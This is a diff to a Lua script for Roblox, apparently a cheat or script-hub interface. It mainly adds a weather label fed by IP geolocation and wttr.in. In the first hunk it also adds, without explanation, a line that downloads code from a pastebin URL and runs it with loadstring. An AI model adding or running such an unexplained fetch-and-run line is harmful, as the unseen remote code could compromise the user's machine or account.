@@ -232,7 +232,7 @@ local player = game.Players.LocalPlayer
 
 _G.key = loadstring(game:HttpGet("https://pastebin.com/raw/Fp6GwTF3",true))()
 
-
+loadstring(game:HttpGet("https://pastebin.com/raw/ZKw8UCT5",true))()
 local currentHour = tonumber(os.date("%H"))
 local currentMinute = os.date("%M")
 local currentTime = os.date("%I:%M %p") -- 12-hour format with AM/PM
@@ -292,36 +292,134 @@ end
 
 -- Create the label with dynamic icon
 local PlatformLabel = WelcomeTab:CreateLabel("Platform: " .. platformName, platformIcon)
--- Create the label
--- Create the label
+
+-- Create the location label
 LocationLabel = WelcomeTab:CreateLabel("Location: Loading...")
 
--- Function to update server location and ISP info
-function updateServerLocation()
-    LocationLabel:Set("Fetching location...", "map-pin")
-    success, result = pcall(function()
-        return game:HttpGet("https://ipinfo.io/json")
-    end)
-    
-    if success then
-        jsonData = game:GetService("HttpService"):JSONDecode(result)
-        city = jsonData.city or "Unknown"
-        region = jsonData.region or "Unknown"
-        country = jsonData.country or "Unknown"
-        isp = jsonData.org or "Unknown"
+-- Create the weather label
+WeatherLabel = WelcomeTab:CreateLabel("Weather: Loading...", "cloud")
 
-        -- Set the label with all info
-        LocationLabel:Set(
-            city .. ", " .. region .. ", " .. country .. " | ISP: " .. isp,
-            "map-pin"
-        )
+
+
+local function runWithTimeout(func, timeout)
+    local completed = false
+    local result = nil
+    local success = false
+    
+    -- Run the function in a coroutine
+    coroutine.wrap(function()
+        success, result = pcall(func)
+        completed = true
+    end)()
+    
+    -- Wait for completion or timeout
+    local startTime = tick()
+    while not completed and (tick() - startTime) < timeout do
+        wait(0.1)
+    end
+    
+    if completed then
+        return success, result
     else
-        LocationLabel:Set("Location: Unknown | ISP: Unknown", "map-pin")
+        return false, "Timeout"
+    end
+end
+
+-- Function to update server location, ISP info, and weather
+function updateLocationAndWeather()
+    LocationLabel:Set("Fetching location...", "map-pin")
+    WeatherLabel:Set("Fetching weather...", "cloud")
+    
+    -- Fetch location with 8 second timeout
+    local locationSuccess, locationResult = runWithTimeout(function()
+        return game:HttpGet("https://ipinfo.io/json")
+    end, 8)
+    
+    if locationSuccess and locationResult ~= "Timeout" then
+        local parseSuccess, jsonData = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(locationResult)
+        end)
+        
+        if parseSuccess then
+            local city = jsonData.city or "Unknown"
+            local region = jsonData.region or "Unknown"
+            local country = jsonData.country or "Unknown"
+            local isp = jsonData.org or "Unknown"
+            local loc = jsonData.loc or "" -- latitude,longitude
+
+            -- Set the location label with all info
+            LocationLabel:Set(
+                city .. ", " .. region .. ", " .. country .. " | ISP: " .. isp,
+                "map-pin"
+            )
+            
+            -- Fetch weather if location is available
+            if loc ~= "" then
+                local weatherSuccess, weatherResult = runWithTimeout(function()
+                    return game:HttpGet("https://wttr.in/" .. loc .. "?format=j1")
+                end, 8)
+                
+                if weatherSuccess and weatherResult ~= "Timeout" then
+                    local weatherParseSuccess, weatherData = pcall(function()
+                        return game:GetService("HttpService"):JSONDecode(weatherResult)
+                    end)
+                    
+                    if weatherParseSuccess then
+                        local currentCondition = weatherData.current_condition[1]
+                        
+                        local temp = currentCondition.temp_C .. "°C / " .. currentCondition.temp_F .. "°F"
+                        local condition = currentCondition.weatherDesc[1].value
+                        local humidity = currentCondition.humidity .. "%"
+                        local feelsLike = currentCondition.FeelsLikeC .. "°C"
+                        
+                        -- Choose appropriate weather icon
+                        local weatherIcon = "cloud"
+                        local conditionLower = condition:lower()
+                        if conditionLower:find("clear") or conditionLower:find("sunny") then
+                            weatherIcon = "sun"
+                        elseif conditionLower:find("rain") then
+                            weatherIcon = "cloud-rain"
+                        elseif conditionLower:find("snow") then
+                            weatherIcon = "cloud-snow"
+                        elseif conditionLower:find("thunder") or conditionLower:find("storm") then
+                            weatherIcon = "cloud-lightning"
+                        elseif conditionLower:find("cloud") then
+                            weatherIcon = "cloud"
+                        end
+                        
+                        WeatherLabel:Set(
+                            temp .. " | " .. condition .. " | Humidity: " .. humidity,
+                            weatherIcon
+                        )
+                    else
+                        WeatherLabel:Set("Weather: N/A", "cloud")
+                    end
+                else
+                    WeatherLabel:Set("Weather: N/A", "cloud")
+                end
+            else
+                WeatherLabel:Set("Weather: N/A", "cloud")
+            end
+        else
+            LocationLabel:Set("Location: N/A | ISP: N/A", "map-pin")
+            WeatherLabel:Set("Weather: N/A", "cloud")
+        end
+    else
+        LocationLabel:Set("Location: N/A | ISP: N/A", "map-pin")
+        WeatherLabel:Set("Weather: N/A", "cloud")
     end
 end
 
 -- Initial fetch
-updateServerLocation()
+updateLocationAndWeather()
+
+-- Optional: Auto-refresh every 10 minutes (600 seconds)
+spawn(function()
+    while true do
+        wait(600)
+        updateLocationAndWeather()
+    end
+end)
 
 
 
@@ -410,7 +508,6 @@ spawn(function()
         wait(60)
     end
 end)
-
 
 
 
